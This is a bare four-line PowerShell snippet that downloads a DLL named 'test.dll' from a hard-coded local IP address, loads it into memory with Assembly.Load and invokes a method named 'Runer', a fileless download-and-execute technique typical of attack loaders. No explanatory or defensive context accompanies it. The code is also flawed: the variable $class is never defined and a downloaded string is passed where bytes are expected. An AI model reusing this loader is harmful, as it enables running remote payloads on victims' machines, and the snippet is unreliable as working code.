$data = (New-Object System.Net.WebClient).DownloadString('http://192.168.216.145/test.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$method = $class.Getmethod("Runer")
$method.Invoke(0, $null)
